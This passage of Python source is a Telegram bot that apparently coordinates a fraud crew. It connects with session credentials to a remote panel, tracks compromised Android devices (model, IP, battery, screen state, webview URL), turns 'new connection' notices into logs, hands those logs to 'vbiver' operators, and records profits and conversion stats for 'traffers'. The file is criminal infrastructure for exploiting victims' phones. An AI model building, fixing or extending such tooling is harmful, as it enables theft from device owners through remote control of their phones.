import os
import re
import csv
import json
import asyncio
import logging
import contextlib
from pathlib import Path
from datetime import datetime, timedelta, timezone
from typing import Any, Dict, List, Optional

import aiosqlite
import websockets
from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import Command
from aiogram.types import (
    Message, CallbackQuery, BotCommand, FSInputFile,
    InlineKeyboardMarkup, InlineKeyboardButton,
)

# ---------------------- CONFIG ----------------------
load_dotenv(dotenv_path=Path(__file__).with_name(".env"))

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS","").split(",") if x.strip().isdigit()}
ALLOWED_CHAT_IDS = {int(x) for x in os.getenv("ALLOWED_CHAT_IDS","").split(",") if x.strip().lstrip("-").isdigit()}

FOUNDER_IDS = {int(x) for x in os.getenv("FOUNDER_IDS","").split(",") if x.strip().isdigit()}
VBIVER_IDS  = {int(x) for x in os.getenv("VBIVER_IDS","").split(",")  if x.strip().isdigit()}
TRAFFER_IDS = {int(x) for x in os.getenv("TRAFFER_IDS","").split(",") if x.strip().isdigit()}

ROLE_TRAFFER = 1
ROLE_VBIVER  = 2
ROLE_FOUNDER = 3

WS_URL    = os.getenv("WS_URL", "")
AUTH_TYPE = (os.getenv("WS_AUTH_TYPE","cookie") or "cookie").lower()
WS_TOKEN  = os.getenv("WS_TOKEN","")
WS_COOKIE = os.getenv("WS_COOKIE","")
WS_ORIGIN = os.getenv("WS_ORIGIN","https://zam.claydc.top")
WS_INIT_AUTH_JSON = os.getenv("WS_INIT_AUTH_JSON","")
WS_AUTH_OK_EVENT  = (os.getenv("WS_AUTH_OK_EVENT","welcome") or "welcome").strip().lower()

WS_USER_AGENT      = os.getenv("WS_USER_AGENT","")
WS_ACCEPT_LANGUAGE = os.getenv("WS_ACCEPT_LANGUAGE","")
WS_CACHE_CONTROL   = os.getenv("WS_CACHE_CONTROL","")
WS_PRAGMA          = os.getenv("WS_PRAGMA","")

BIG_PROFIT = int(os.getenv("BIG_PROFIT", "5000"))
SLA_HOURS  = int(os.getenv("SLA_HOURS", "8"))
DB_PATH    = os.getenv("DB_PATH", "clonnex.db")
STATS_DEFAULT = (os.getenv("STATS_DEFAULT_PERIOD","30d") or "30d").lower()

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("clonnex")

# ---------------------- ACCESS ----------------------
def allowed_chat(chat_id: int) -> bool:
    return (not ALLOWED_CHAT_IDS) or (chat_id in ALLOWED_CHAT_IDS)

def role_level(uid: int) -> int:
    if uid in FOUNDER_IDS: return ROLE_FOUNDER
    if uid in VBIVER_IDS:  return ROLE_VBIVER
    if uid in TRAFFER_IDS: return ROLE_TRAFFER
    return 0

# ---------------------- DB LAYER ----------------------
SCHEMA_SQL = """
PRAGMA journal_mode=WAL;
CREATE TABLE IF NOT EXISTS users(
  user_id     INTEGER PRIMARY KEY,
  role        TEXT NOT NULL,              -- founder|vbiver|traffer
  created_at  TEXT NOT NULL,
  updated_at  TEXT NOT NULL
);
CREATE TABLE IF NOT EXISTS logs(
  uuid         TEXT PRIMARY KEY,
  raw          TEXT,
  quarantined  INTEGER DEFAULT 0,
  assigned_to  INTEGER,
  assigned_at  TEXT,
  worker       TEXT,
  operator     TEXT,
  trafer_id    INTEGER,
  source       TEXT,
  ip           TEXT,
  model        TEXT,
  android      TEXT,
  ts           TEXT,
  profit       REAL DEFAULT 0,
  profit_note  TEXT,
  profited_at  TEXT,
  state        TEXT DEFAULT '',
  last_update  TEXT
);
CREATE INDEX IF NOT EXISTS idx_logs_assigned ON logs(assigned_to);
CREATE INDEX IF NOT EXISTS idx_logs_quarantine ON logs(quarantined);
CREATE INDEX IF NOT EXISTS idx_logs_trafer ON logs(trafer_id);
CREATE TABLE IF NOT EXISTS templates(
  id          INTEGER PRIMARY KEY AUTOINCREMENT,
  owner_id    INTEGER NOT NULL,
  name        TEXT NOT NULL,
  text        TEXT NOT NULL,
  created_at  TEXT NOT NULL
);
CREATE TABLE IF NOT EXISTS blacklist(
  uuid        TEXT PRIMARY KEY,
  created_at  TEXT NOT NULL,
  author_id   INTEGER
);
CREATE TABLE IF NOT EXISTS profits(
  id          INTEGER PRIMARY KEY AUTOINCREMENT,
  uuid        TEXT NOT NULL,
  user_id     INTEGER NOT NULL,
  amount      REAL NOT NULL,
  note        TEXT,
  created_at  TEXT NOT NULL
);
CREATE TABLE IF NOT EXISTS events(
  id          INTEGER PRIMARY KEY AUTOINCREMENT,
  kind        TEXT NOT NULL,
  data        TEXT NOT NULL,
  created_at  TEXT NOT NULL
);
"""

class DB:
    def __init__(self, path: str) -> None:
        self.path = path
        self.conn: Optional[aiosqlite.Connection] = None

    async def open(self):
        self.conn = await aiosqlite.connect(self.path)
        self.conn.row_factory = aiosqlite.Row
        await self.conn.executescript(SCHEMA_SQL)
        await self.conn.commit()

    async def close(self):
        if self.conn:
            await self.conn.close()

    # --- users/roles ---
    async def upsert_role(self, uid: int, role: str):
        now = datetime.now(timezone.utc).isoformat()
        await self.conn.execute(
            "INSERT INTO users(user_id, role, created_at, updated_at) VALUES(?,?,?,?) "
            "ON CONFLICT(user_id) DO UPDATE SET role=excluded.role, updated_at=excluded.updated_at",
            (uid, role, now, now)
        )
        await self.conn.commit()

    async def get_role(self, uid: int) -> str:
        cur = await self.conn.execute("SELECT role FROM users WHERE user_id=?", (uid,))
        row = await cur.fetchone()
        return row["role"] if row else ""

    # --- logs ---
    async def upsert_log(self, data: Dict[str, Any]):
        keys = ("uuid","raw","quarantined","assigned_to","assigned_at","worker","operator",
                "trafer_id","source","ip","model","android","ts","profit","profit_note","profited_at","state")
        now = datetime.now(timezone.utc).isoformat()
        data = {k: data.get(k) for k in keys} | {"last_update": now}
        cols = ",".join(data.keys())
        ph   = ",".join(["?"]*len(data))
        upd  = ",".join([f"{k}=excluded.{k}" for k in data.keys()])
        await self.conn.execute(
            f"INSERT INTO logs({cols}) VALUES({ph}) ON CONFLICT(uuid) DO UPDATE SET {upd}",
            tuple(data.values())
        )
        await self.conn.commit()

    async def assign_first_free(self, user_id: int) -> Optional[Dict[str, Any]]:
        # не выдаём: quarantined, blacklist, уже назначенные
        cur = await self.conn.execute("""
        SELECT l.* FROM logs l
        LEFT JOIN blacklist b ON b.uuid = l.uuid
        WHERE l.assigned_to IS NULL
          AND l.quarantined = 0
          AND b.uuid IS NULL
        ORDER BY l.ts ASC
        LIMIT 1
        """)
        row = await cur.fetchone()
        if not row:
            return None
        now = datetime.now(timezone.utc).isoformat()
        await self.conn.execute("UPDATE logs SET assigned_to=?, assigned_at=? WHERE uuid=?",
                                (user_id, now, row["uuid"]))
        await self.conn.commit()
        return dict(row) | {"assigned_to": user_id, "assigned_at": now}

    async def get_my_active(self, user_id: int) -> Optional[Dict[str, Any]]:
        cur = await self.conn.execute("SELECT * FROM logs WHERE assigned_to=? ORDER BY assigned_at DESC LIMIT 1", (user_id,))
        row = await cur.fetchone()
        return dict(row) if row else None

    async def release_my(self, user_id: int):
        await self.conn.execute("UPDATE logs SET assigned_to=NULL, assigned_at=NULL WHERE assigned_to=?", (user_id,))
        await self.conn.commit()

    async def set_profit(self, uuid: str, user_id: int, amount: float, note: str):
        now = datetime.now(timezone.utc).isoformat()
        await self.conn.execute("UPDATE logs SET profit=?, profit_note=?, profited_at=? WHERE uuid=?",
                                (amount, note, now, uuid))
        await self.conn.execute("INSERT INTO profits(uuid,user_id,amount,note,created_at) VALUES(?,?,?,?,?)",
                                (uuid, user_id, amount, note, now))
        await self.conn.commit()

    async def quarantined_for(self, trafer_id: int | None) -> List[Dict[str, Any]]:
        if trafer_id:
            cur = await self.conn.execute("SELECT * FROM logs WHERE quarantined=1 AND (trafer_id=? OR ? IN (SELECT user_id FROM users WHERE role='founder')) ORDER BY ts DESC LIMIT 100",
                                          (trafer_id, trafer_id))
        else:
            cur = await self.conn.execute("SELECT * FROM logs WHERE quarantined=1 ORDER BY ts DESC LIMIT 100")
        rows = await cur.fetchall()
        return [dict(r) for r in rows]

    async def clear_quarantine(self, uuid: str):
        await self.conn.execute("UPDATE logs SET quarantined=0 WHERE uuid=?", (uuid,))
        await self.conn.commit()

    async def delete_log(self, uuid: str):
        await self.conn.execute("DELETE FROM logs WHERE uuid=?", (uuid,))
        await self.conn.commit()

    async def inbox_for_trafer(self, trafer_id: int, since_hours: int = 24) -> List[Dict[str, Any]]:
        since = (datetime.now(timezone.utc) - timedelta(hours=since_hours)).isoformat()
        cur = await self.conn.execute("""
        SELECT * FROM logs
        WHERE (trafer_id=? OR trafer_id IS NULL) AND (assigned_to IS NULL) AND (ts>=?)
        ORDER BY ts DESC LIMIT 50
        """, (trafer_id, since))
        return [dict(r) for r in await cur.fetchall()]

    async def stats_for_trafer(self, trafer_id: int, period: str) -> Dict[str, Any]:
        now = datetime.now(timezone.utc)
        if period == "24h": since = (now - timedelta(hours=24)).isoformat()
        elif period == "7d": since = (now - timedelta(days=7)).isoformat()
        elif period == "30d": since = (now - timedelta(days=30)).isoformat()
        else: since = None

        if since:
            cur = await self.conn.execute("SELECT * FROM logs WHERE trafer_id=? AND ts>=?", (trafer_id, since))
        else:
            cur = await self.conn.execute("SELECT * FROM logs WHERE trafer_id=?", (trafer_id,))
        items = [dict(r) for r in await cur.fetchall()]

        total = len(items)
        denied = sum(1 for v in items if v["quarantined"])
        live = total - denied
        assigned = sum(1 for v in items if v["assigned_to"])
        profited = [v for v in items if (v["profit"] or 0) > 0]
        profit_sum = sum(float(v["profit"] or 0) for v in profited)
        profit_cnt = len(profited)
        profit_avg = (profit_sum / profit_cnt) if profit_cnt else 0.0

        def _parse(ts): 
            return datetime.fromisoformat(ts.replace("Z","+00:00")) if ts else None
        assign_deltas, profit_deltas = [], []
        for v in items:
            t0=_parse(v["ts"]); ta=_parse(v["assigned_at"]); tp=_parse(v["profited_at"])
            if t0 and ta: assign_deltas.append((ta-t0).total_seconds())
            if t0 and tp: profit_deltas.append((tp-t0).total_seconds())
        def _fmt(x):
            if not x: return "-"
            m,s = divmod(int(x),60); h,m=divmod(m,60)
            return f"{h}ч {m}м"
        assign_avg = _fmt(sum(assign_deltas)/len(assign_deltas) if assign_deltas else 0)
        profit_time = _fmt(sum(profit_deltas)/len(profit_deltas) if profit_deltas else 0)

        # источники
        src = {}
        for v in items:
            k = v.get("source") or "—"
            src[k] = src.get(k,0)+1
        top_src = [f"• {k}: {v}" for k,v in sorted(src.items(), key=lambda x:-x[1])[:5]]

        return {
            "period": period, "total": total, "denied": denied, "live": live,
            "assigned": assigned, "profit_sum": profit_sum, "profit_cnt": profit_cnt, "profit_avg": profit_avg,
            "assign_avg": assign_avg, "profit_time": profit_time, "top_src": top_src,
            "live_rate": (live/total*100) if total else 0.0,
            "conv": (profit_cnt/total*100) if total else 0.0,
        }

    async def export_profits_csv(self, path: str, days: int = 30):
        since = (datetime.now(timezone.utc) - timedelta(days=days)).isoformat()
        cur = await self.conn.execute("""
        SELECT p.created_at, p.uuid, p.user_id, p.amount, p.note,
               l.trafer_id, l.worker, l.operator, l.source
        FROM profits p
        LEFT JOIN logs l ON l.uuid=p.uuid
        WHERE p.created_at>=?
        ORDER BY p.created_at DESC
        """, (since,))
        rows = await cur.fetchall()
        with open(path, "w", newline="", encoding="utf-8") as f:
            w = csv.writer(f, delimiter=';')
            w.writerow(["created_at","uuid","vbiver_id","amount","note","trafer_id","worker","operator","source"])
            for r in rows:
                w.writerow([r["created_at"], r["uuid"], r["user_id"], r["amount"], r["note"] or "",
                            r["trafer_id"] or "", r["worker"] or "", r["operator"] or "", r["source"] or ""])

    # --- templates ---
    async def add_template(self, owner_id: int, name: str, text: str):
        now = datetime.now(timezone.utc).isoformat()
        await self.conn.execute("INSERT INTO templates(owner_id,name,text,created_at) VALUES(?,?,?,?)",
                                (owner_id, name, text, now))
        await self.conn.commit()

    async def list_templates(self, owner_id: int, limit: int = 20) -> List[Dict[str,Any]]:
        cur = await self.conn.execute("SELECT * FROM templates WHERE owner_id=? ORDER BY id DESC LIMIT ?", (owner_id, limit))
        return [dict(r) for r in await cur.fetchall()]

    async def delete_template(self, owner_id: int, tpl_id: int):
        await self.conn.execute("DELETE FROM templates WHERE owner_id=? AND id=?", (owner_id, tpl_id))
        await self.conn.commit()

    # --- blacklist ---
    async def blacklist_add(self, author_id: int, uuid: str):
        now = datetime.now(timezone.utc).isoformat()
        await self.conn.execute("INSERT OR IGNORE INTO blacklist(uuid,created_at,author_id) VALUES(?,?,?)",
                                (uuid, now, author_id))
        await self.conn.commit()

    async def blacklist_del(self, uuid: str):
        await self.conn.execute("DELETE FROM blacklist WHERE uuid=?", (uuid,))
        await self.conn.commit()

    async def blacklist_all(self) -> List[str]:
        cur = await self.conn.execute("SELECT uuid FROM blacklist ORDER BY created_at DESC LIMIT 100")
        return [r["uuid"] for r in await cur.fetchall()]


# ---------------------- RUNTIME STATE ----------------------
DEVICES: Dict[str, Dict[str, Any]] = {}
RE_DENIED = re.compile(r"\bpermission\s+denied\b", re.I)

# ожидания ввода
PENDING_PROFIT: Dict[int, str] = {}     # user_id -> uuid
PENDING_BL_ACTION: Dict[int, str] = {}  # user_id -> "add"/"del"
PENDING_TPL: Dict[int, Dict[str, Any]] = {}  # {uid: {"mode": "name"/"text", "buffer":{}}}
PENDING_TPL_SEND: Dict[int, Dict[str, Any]] = {} # {uid: {"tpl_id": int, "uuid": str, "target": "self|chat", ...}}

# ---------------------- UI ----------------------
def kb_main(uid: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⚙️ Ворк-панель", callback_data="menu:work")]
    ])

def kb_work(uid: int) -> InlineKeyboardMarkup:
    lvl = role_level(uid)
    rows = []
    if lvl >= ROLE_TRAFFER:
        rows.append([InlineKeyboardButton(text="📬 Трафф-панель", callback_data="work:tr")])
    if lvl >= ROLE_VBIVER:
        rows.append([InlineKeyboardButton(text="🧲 Вбив-панель", callback_data="work:vb")])
    if lvl >= ROLE_FOUNDER:
        rows.append([InlineKeyboardButton(text="🛠 Админ-панель", callback_data="work:admin")])
    rows.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="menu:root")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def kb_tr(uid: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✉️ Входящие",      callback_data="tr:inbox")],
        [InlineKeyboardButton(text="🚫 Ошибки доступа", callback_data="tr:denied")],
        [InlineKeyboardButton(text="📈 Источники",      callback_data="tr:sources")],
        [InlineKeyboardButton(text="📊 Статистика",     callback_data=f"tr:stats:{STATS_DEFAULT}")],
        [InlineKeyboardButton(text="🧱 Билдер",         callback_data="tr:builder")],
        [InlineKeyboardButton(text="⬅️ Назад",          callback_data="menu:work")],
    ])

def kb_tr_denied_list(uid: int, uuids: List[str]) -> InlineKeyboardMarkup:
    rows = []
    for u in uuids[:10]:
        rows.append([
            InlineKeyboardButton(text=f"{u[:8]}…", callback_data=f"tr:denied:view:{u}"),
            InlineKeyboardButton(text="✅ Исправлено", callback_data=f"tr:denied:fix:{u}"),
            InlineKeyboardButton(text="🗑 Удалить",   callback_data=f"tr:denied:del:{u}"),
        ])
    rows.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="work:tr")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def kb_vb(uid: int, has_active: bool) -> InlineKeyboardMarkup:
    rows = [[InlineKeyboardButton(text="🧲 Получить лог", callback_data="vb:get")],
            [InlineKeyboardButton(text="📦 Мой лог",      callback_data="vb:my")]]
    if has_active:
        rows.append([InlineKeyboardButton(text="💰 Профит", callback_data="vb:profit"),
                     InlineKeyboardButton(text="🔓 Освободить", callback_data="vb:free")])
    rows.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="menu:work")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def kb_admin(uid: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👷 Роли пользователей", callback_data="admin:roles")],
        [InlineKeyboardButton(text="⛔ Blacklist UUID",     callback_data="admin:blacklist")],
        [InlineKeyboardButton(text="📊 Отчёты/Экспорт",     callback_data="admin:reports")],
        [InlineKeyboardButton(text="⬅️ Назад",              callback_data="menu:work")],
    ])

def kb_admin_blacklist() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📄 Список",   callback_data="admin:blacklist:list")],
        [InlineKeyboardButton(text="➕ Добавить", callback_data="admin:blacklist:add")],
        [InlineKeyboardButton(text="➖ Удалить",  callback_data="admin:blacklist:del")],
        [InlineKeyboardButton(text="⬅️ Назад",   callback_data="work:admin")],
    ])

def kb_builder_menu(tpls: List[Dict[str, Any]]) -> InlineKeyboardMarkup:
    kb = []
    for t in tpls[:10]:
        kb.append([InlineKeyboardButton(text=f"📄 {t['name']}", callback_data=f"builder:view:{t['id']}")])
    kb.append([InlineKeyboardButton(text="➕ Создать шаблон", callback_data="builder:new")])
    kb.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="work:tr")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def kb_tpl_view(tpl_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📤 Отправить (self)", callback_data=f"builder:send:self:{tpl_id}")],
        [InlineKeyboardButton(text="📤 Отправить в чат",  callback_data=f"builder:send:chat:{tpl_id}")],
        [InlineKeyboardButton(text="🗑 Удалить",          callback_data=f"builder:del:{tpl_id}")],
        [InlineKeyboardButton(text="⬅️ Назад",            callback_data="tr:builder")],
    ])

# ---------------------- WS CLIENT ----------------------
class WSClient:
    def __init__(self, bot: Bot, db: DB):
        self.ws: Optional[websockets.WebSocketClientProtocol] = None
        self.bot = bot
        self.db = db
        self.auth_ok = False

    def _conn_args(self) -> Dict[str, Any]:
        headers: Dict[str,str] = {}
        if AUTH_TYPE == "bearer" and WS_TOKEN: headers["Authorization"] = f"Bearer {WS_TOKEN}"
        if AUTH_TYPE == "cookie" and WS_COOKIE: headers["Cookie"] = WS_COOKIE
        if WS_ORIGIN:          headers["Origin"] = WS_ORIGIN
        if WS_USER_AGENT:      headers["User-Agent"] = WS_USER_AGENT
        if WS_ACCEPT_LANGUAGE: headers["Accept-Language"] = WS_ACCEPT_LANGUAGE
        if WS_CACHE_CONTROL:   headers["Cache-Control"] = WS_CACHE_CONTROL
        if WS_PRAGMA:          headers["Pragma"] = WS_PRAGMA
        k: Dict[str, Any] = {}
        if headers: k["extra_headers"] = headers
        if AUTH_TYPE == "protocol" and WS_TOKEN:
            toks = [t.strip() for t in WS_TOKEN.split(",") if t.strip()]
            k["subprotocols"] = toks or [WS_TOKEN]
        return k

    async def run(self):
        if not WS_URL:
            log.error("WS_URL пуст"); await asyncio.Future()

        backoff = 1
        while True:
            try:
                log.info("WS connecting → %s", WS_URL)
                async with websockets.connect(
                    WS_URL, ping_interval=20, ping_timeout=20,
                    open_timeout=8, close_timeout=5, max_size=None,
                    **self._conn_args()
                ) as ws:
                    self.ws = ws
                    self.auth_ok = False
                    log.info("WS connected; protocol=%s", ws.subprotocol or "-")

                    if WS_INIT_AUTH_JSON:
                        with contextlib.suppress(Exception):
                            await ws.send(WS_INIT_AUTH_JSON)
                            log.info("WS sent init auth json")

                    asyncio.create_task(self._auth_watchdog())

                    async for raw in ws:
                        data = self._parse_frame(raw)
                        t = (data.get("type") or "").lower()
                        evt = (data.get("event") or "").lower()

                        if not self.auth_ok:
                            ok_by_env = (WS_AUTH_OK_EVENT and (t == WS_AUTH_OK_EVENT or evt == WS_AUTH_OK_EVENT))
                            ok_by_known = evt in {"welcome","clients_update"} or t in {"device_info","apps_list","log_upsert"}
                            if ok_by_env or ok_by_known:
                                self.auth_ok = True
                                log.info("AUTH OK ✅")

                        await self._handle(data)

            except asyncio.TimeoutError:
                log.warning("WS open timeout; reconnect in %ss", backoff)
                await asyncio.sleep(backoff); backoff = min(backoff*2, 30)
            except websockets.InvalidStatusCode as e:
                log.warning("WS InvalidStatusCode: %s headers=%s; reconnect in %ss", e.status_code, getattr(e,"headers",None), backoff)
                await asyncio.sleep(backoff); backoff = min(backoff*2, 30)
            except Exception as e:
                log.warning("WS error: %r; reconnect in %ss", e, backoff)
                await asyncio.sleep(backoff); backoff = min(backoff*2, 30)

    async def _auth_watchdog(self):
        await asyncio.sleep(5)
        if not self.auth_ok:
            log.error("AUTH not confirmed in 5s — проверь cookie/init-json")

    def _parse_frame(self, raw: str) -> Dict[str, Any]:
        try: return json.loads(raw)
        except Exception: return {"type":"text","text":raw}

    async def _handle(self, data: Dict[str, Any]):
        evt = (data.get("event") or "").lower()
        typ = (data.get("type") or "").lower()

        if evt == "clients_update" and isinstance(data.get("clients"), list):
            for c in data["clients"]:
                did = c.get("ID") or c.get("UUID") or c.get("id") or c.get("uuid")
                if not did: continue
                DEVICES.setdefault(did, {}).update({
                    "name":          c.get("DeviceName") or c.get("DeviceModel"),
                    "model":         c.get("DeviceModel"),
                    "android":       c.get("AndroidVersion"),
                    "battery":       c.get("BatteryLevel"),
                    "ip":            c.get("IP") or c.get("IPAddress"),
                    "is_online":     bool(c.get("IsConnected")),
                    "screen":        "on" if c.get("IsScreenOn") else "off",
                    "worker":        c.get("worker_name"),
                    "client":        c.get("ClientType"),
                    "connection":    c.get("ConnectionMethod") or c.get("ConnectionType"),
                    "last_seen":     c.get("FormattedLastSeen") or c.get("LastSeen"),
                    "connected_for": c.get("FormatTimeConnected"),
                    "webview_url":   c.get("webview_url"),
                })
            log.info("[cache] devices updated: %d", len(DEVICES))
            return

        if typ == "text" and isinstance(data.get("text"), str):
            await self._ingest_pretty_connect(data["text"])
            return

        if evt == "log_upsert" or typ == "log_upsert":
            await self._ingest_log_json(data)
            return

        log.info("[WS recv] %s", data)

    async def _ingest_pretty_connect(self, txt: str):
        if "Новый коннект" not in txt:
            return
        def cut(after: str):
            i = txt.find(after)
            if i == -1: return ""
            j = txt.find("\n", i)
            return txt[i+len(after): j if j!=-1 else None].strip()

        model   = cut("⚙️ Модель:") or cut("Модель:")
        android = cut("ℹ️ Версия Android:") or cut("Версия Android:")
        ip      = cut("🔗 IP-Address:") or cut("IP-Address:")
        worker  = cut("👷 Воркер:") or cut("Воркер:")
        uuid    = cut("🆔 ID:") or cut("ID:")
        # TG: id
        trafer_uid = None
        if "TG:" in worker:
            tail = worker.split("TG:")[-1]
            digits = "".join(ch for ch in tail if ch.isdigit())
            trafer_uid = int(digits) if digits else None
            worker = worker.split("(")[0].strip()
        raw_norm = " ".join(txt.lower().replace("•","").split())
        denied = bool(RE_DENIED.search(raw_norm))
        if not uuid:
            return
        payload = {
            "uuid": uuid, "raw": txt, "quarantined": 1 if denied else 0,
            "assigned_to": None, "assigned_at": None,
            "worker": worker or None, "operator": None, "trafer_id": trafer_uid,
            "source": None, "ip": ip or None, "model": model or None, "android": android or None,
            "ts": datetime.now(timezone.utc).isoformat(),
        }
        await self.db.upsert_log(payload)
        if denied and trafer_uid:
            with contextlib.suppress(Exception):
                await self.bot.send_message(trafer_uid,
                    f"🚫 <b>Лог с ошибкой доступа</b>\nUUID: <code>{uuid}</code>\nОбнаружено: <code>permission denied</code>",
                    parse_mode="HTML")

    async def _ingest_log_json(self, data: Dict[str, Any]):
        uuid = data.get("uuid") or data.get("UUID")
        if not uuid: return
        raw   = data.get("raw") or ""
        meta  = data.get("meta") or {}
        worker = data.get("worker") or meta.get("worker")
        operator = data.get("operator") or meta.get("operator")
        trafer_uid = data.get("traffer_user_id") or meta.get("traffer_user_id")
        ts = data.get("ts") or datetime.now(timezone.utc).isoformat()
        source = meta.get("source") or meta.get("ref")
        ip = meta.get("ip")
        model = meta.get("model")
        android = meta.get("android")
        raw_norm = " ".join(str(raw).lower().replace("•","").split())
        denied = bool(RE_DENIED.search(raw_norm))
        payload = {
            "uuid": uuid, "raw": raw, "quarantined": 1 if denied else 0,
            "assigned_to": None, "assigned_at": None,
            "worker": worker, "operator": operator, "trafer_id": trafer_uid,
            "source": source, "ip": ip, "model": model, "android": android,
            "ts": ts
        }
        await self.db.upsert_log(payload)
        if denied and trafer_uid:
            with contextlib.suppress(Exception):
                await self.bot.send_message(trafer_uid,
                    f"🚫 <b>Лог с ошибкой доступа</b>\nUUID: <code>{uuid}</code>\nОбнаружено: <code>permission denied</code>",
                    parse_mode="HTML")

    async def send(self, obj: Dict[str, Any]):
        if not self.ws:
            log.warning("WS not connected; drop %s", obj); return
        await self.ws.send(json.dumps(obj))
        log.info("[WS send] %s", obj)

# ---------------------- HELPERS ----------------------
def ensure(msg_or_cb: Message | CallbackQuery) -> bool:
    chat_id = msg_or_cb.chat.id if isinstance(msg_or_cb, Message) else msg_or_cb.message.chat.id
    return allowed_chat(chat_id)

def fmt_stats(s: Dict[str, Any]) -> str:
    return (
        f"📊 <b>Статистика ({s['period']})</b>\n"
        f"Всего: <b>{s['total']}</b>\n"
        f"Denied: <b>{s['denied']}</b> • Live: <b>{s['live']}</b> (<i>{s['live_rate']:.0f}%</i>)\n"
        f"Назначено: <b>{s['assigned']}</b>\n"
        f"Профиты: <b>{s['profit_cnt']}</b> / <b>{s['profit_sum']:.0f}</b> (avg {s['profit_avg']:.0f})\n"
        f"Средн. до назначения: <b>{s['assign_avg']}</b>\n"
        f"Средн. до профита: <b>{s['profit_time']}</b>\n\n"
        f"<b>Топ источников</b>:\n" + ("\n".join(s['top_src']) if s['top_src'] else "—")
    )

# ---------------------- TELEGRAM ----------------------
router = Router()

@router.message(Command("whoami"))
async def whoami(m: Message): await m.answer(f"user_id: {m.from_user.id}\nchat_id: {m.chat.id}")

@router.message(Command("whereami"))
async def whereami(m: Message): await m.answer(f"chat_id: {m.chat.id}")

@router.message(Command("start"))
async def start(m: Message):
    if not ensure(m): return
    await m.answer("Готов. Открывай /menu", reply_markup=kb_main(m.from_user.id))

@router.message(Command("menu"))
async def menu(m: Message):
    if not ensure(m): return
    if role_level(m.from_user.id) == 0:
        await m.answer("Нет доступа"); return
    await m.answer("⚙️ Ворк-панель", reply_markup=kb_work(m.from_user.id))

@router.message(Command("ping"))
async def ping(m: Message):
    if not ensure(m): return
    await m.answer("pong")

@router.message(Command("devices"))
async def devices(m: Message):
    if not ensure(m): return
    if not DEVICES:
        await m.answer("Пока нет данных по устройствам."); return
    lines = []
    for d, v in list(DEVICES.items())[:60]:
        name = v.get("name") or v.get("model") or "?"
        st = "online" if v.get("is_online") else "offline"
        lines.append(f"• <code>{d}</code> — {name} — {st}")
    if len(DEVICES)>60: lines.append(f"…ещё {len(DEVICES)-60}")
    await m.answer("\n".join(lines), parse_mode="HTML")

@router.message(Command("device"))
async def device(m: Message, ws: WSClient):
    if not ensure(m): return
    parts = m.text.split(maxsplit=1)
    if len(parts)<2:
        await m.answer("используй: /device <id>"); return
    dev = parts[1].strip()
    v = DEVICES.get(dev, {})
    text = (
        f"<b>{v.get('name') or v.get('model','?')}</b>\n"
        f"Android: {v.get('android','?')} • Статус: {'online' if v.get('is_online') else 'offline'} • Экран: {v.get('screen','?')}\n"
        f"IP: {v.get('ip','?')} • Соединение: {v.get('connection','?')}\n"
        f"Работник: {v.get('worker','-')}\n"
        f"Послед. активность: {v.get('last_seen','-')}\n"
    )
    await m.answer(text, parse_mode="HTML")
    await ws.send({"type":"cmd","action":"device_info_get","device_id":dev})

# --- INLINE NAV ---
@router.callback_query(F.data == "menu:root")
async def cb_root(c: CallbackQuery):
    await c.message.edit_text("главное меню", reply_markup=kb_main(c.from_user.id)); await c.answer()

@router.callback_query(F.data == "menu:work")
async def cb_work(c: CallbackQuery):
    if role_level(c.from_user.id) == 0:
        await c.answer("нет доступа", show_alert=True); return
    await c.message.edit_text("⚙️ Ворк-панель", reply_markup=kb_work(c.from_user.id)); await c.answer()

# --- ADMIN PANEL ---
@router.callback_query(F.data == "work:admin")
async def cb_admin(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_FOUNDER:
        await c.answer("только founder", show_alert=True); return
    await c.message.edit_text("🛠 Админ-панель", reply_markup=kb_admin(c.from_user.id)); await c.answer()

@router.callback_query(F.data == "admin:blacklist")
async def cb_admin_blacklist(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_FOUNDER:
        await c.answer("нет доступа", show_alert=True); return
    await c.message.edit_text("⛔ Blacklist UUID", reply_markup=kb_admin_blacklist()); await c.answer()

@router.callback_query(F.data == "admin:blacklist:list")
async def cb_admin_blacklist_list(c: CallbackQuery, db: DB):
    items = await db.blacklist_all()
    text = "⛔ <b>Blacklist</b>\n" + ("\n".join(f"• <code>{x}</code>" for x in items) if items else "— пусто —")
    await c.message.edit_text(text, parse_mode="HTML", reply_markup=kb_admin_blacklist()); await c.answer()

@router.callback_query(F.data == "admin:blacklist:add")
async def cb_admin_blacklist_add(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_FOUNDER:
        await c.answer("нет доступа", show_alert=True); return
    PENDING_BL_ACTION[c.from_user.id] = "add"
    await c.message.edit_text("Введи UUID для <b>добавления</b> в blacklist одним сообщением.", parse_mode="HTML",
                              reply_markup=kb_admin_blacklist()); await c.answer()

@router.callback_query(F.data == "admin:blacklist:del")
async def cb_admin_blacklist_del(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_FOUNDER:
        await c.answer("нет доступа", show_alert=True); return
    PENDING_BL_ACTION[c.from_user.id] = "del"
    await c.message.edit_text("Введи UUID для <b>удаления</b> из blacklist одним сообщением.", parse_mode="HTML",
                              reply_markup=kb_admin_blacklist()); await c.answer()

@router.callback_query(F.data == "admin:reports")
